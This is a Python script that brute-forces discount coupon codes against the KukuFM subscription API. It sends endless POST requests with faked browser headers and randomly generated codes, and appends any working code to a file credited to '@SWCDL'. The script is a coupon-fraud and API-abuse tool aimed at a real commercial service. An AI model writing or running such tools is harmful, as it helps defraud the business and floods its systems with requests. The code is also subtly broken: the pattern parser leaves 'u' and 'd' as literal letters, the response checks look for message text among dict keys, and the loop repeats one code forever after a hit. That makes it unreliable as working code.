import requests
import random

def random_string(pattern):
    """
    Generates a random string based on the given pattern
    """
    code = ''
    for char in pattern:
        if char == '?':
            code += random.choice('abcdefghijklmnopqrstuvwxyz')
        else:
            code += char
    return code

def check_coupon_apply(code):
    """
    Sends a POST request to check if a coupon code is valid
    """
    url = "https://kukufm.com/api/v1.1/orders/check-coupon-apply/"
    headers = {
        "Host": "kukufm.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Chrome/116.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://kukufm.com",
        "Connection": "keep-alive",
        "Referer": "https://kukufm.com/subscription/hindi",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "TE": "trailers"
    }
    payload = {
        "build_number": "undefined",
        "coupon_code": code,
        "premium_plan_id": 1
    }

    response = requests.post(url, headers=headers, data=payload)
    json_data = response.json()

    if "Invalid Coupon Code" in json_data or "Coupon Not Valid" in json_data:
        return {"success": False, "status": "Failure"}
    elif "Congratulations" in json_data:
        coupon_discount_amount = json_data.get("coupon_discount_amount", "N/A")
        valid_till = json_data.get("valid_till", "N/A")
        return {"success": True, "status": "Success", "coupon_discount_amount": coupon_discount_amount, "valid_till": valid_till}
    elif "Coupons are not allowed in" in json_data:
        return {"success": True, "status": "Retry"}
    elif "Coupon already used, please try another coupon" in json_data:
        return {"success": True, "status": "Coupon already used"}
    elif "EXPIRED" in json_data:
        return {"success": True, "status": "Custom", "custom_status": "EXPIRED"}
    else:
        return {"success": False, "status": "Unknown"}

code = random_string("FKS?u?u?d?d?u?d?d")

while True:
    result = check_coupon_apply(code)

    # Print the result
    if result["success"]:
        print("Success:", code)
        print("Status:", result["status"])
        if result["status"] == "Success":
            print("Coupon Discount Amount:", result["coupon_discount_amount"])
            print("Valid Till:", result["valid_till"])
            config_data = f"Code = {code} | MaDe By = @SWCDL"
            with open("code.txt", "a") as file:
                file.write(config_data + "\n")
    else:
        print("Failure:", code)
        code = random_string("FKS?u?u?d?d?u?d?d")
        
       
        
        
